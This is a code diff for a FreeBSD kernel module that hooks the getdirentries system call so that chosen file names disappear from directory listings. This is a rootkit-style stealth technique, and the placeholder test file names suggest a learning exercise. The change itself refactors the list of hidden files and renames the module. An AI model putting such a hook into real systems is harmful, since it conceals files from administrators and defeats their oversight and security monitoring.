@@ -9,8 +9,10 @@
 #include <sys/sysproto.h>
 #include <sys/dirent.h>
 
-const char hidden_files[2][512] = {
-	"test1.txt", "test2.txt"
+#define LEN(x) ((sizeof(x)) / (sizeof(x[0])))
+
+const char hidden_files[][512] = {
+	"test1.txt", "test2.txt", "test3.jpg"
 };
 
 /* getdirentries system call hook */
@@ -63,7 +65,7 @@ getdirentries_hook(struct thread* td, void* syscall_args)
 			count -= current->d_reclen;
 
 			/* Check if this is a file we want to hide */
-			for (int i = 0; i < 2; i++)
+			for (int i = 0; i < LEN(hidden_files); i++)
 			{
 				if(strcmp(current->d_name, hidden_files[i]) == 0)
 				{
@@ -117,10 +119,10 @@ load(struct module* module, int cmd, void* arg)
 	return error;
 }
 
-static moduledata_t mkdir_hook_mod = {
+static moduledata_t getdirentries_hook_mod = {
 	"getdirentries_hook",    /* module name */
 	load,                    /* event handler */
 	NULL                     /* extra data */
 };
 
-DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+DECLARE_MODULE(getdirentries_hook, getdirentries_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
